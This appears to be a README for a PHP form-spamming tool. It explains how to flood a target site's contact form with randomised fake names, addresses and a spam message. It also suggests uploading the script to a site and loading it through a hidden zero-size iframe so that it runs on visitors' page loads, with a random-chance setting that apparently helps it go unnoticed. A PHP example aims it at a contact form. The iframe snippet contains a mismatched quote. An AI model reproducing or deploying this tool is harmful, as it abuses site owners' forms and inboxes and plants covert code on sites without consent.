# Email Spammer

Spam a local or remote form. Remote Execute by firing the file from your server.  Or upload the script (if you can) and run from an iframe.  Then the file will try to execute everytime a visitor loads the page.

```html
<iframe src="class.spammer.php" height="0' width="0"></iframe>
```

#### NOTE
The $spammer->chance(20) variable is a "1 in ?" setting.  If you use "1" then it will execute everytime. The default setting is "1 in 20".  Meaning there's a 5% chance of it running on every execution.

## Example Usage
```php
$spammer = new spammer('http://domain.com/contact.php');
if($spammer->chance(10)):
  $fields = array(
    'first_name' => $spammer->firstName()[0],
  	'last_name' => $spammer->surName()[0],
  	'email' => $spammer->randomize(rand(5,10)).'@'.$spammer->randomize(rand(5,10)).$spammer->tld[0],
  	'message' => urlencode('This is a spammy message!'),
  	'submit' => 'send'
  );
  $spammer->fields = $fields;
  $spammer->execute();
endif;
```
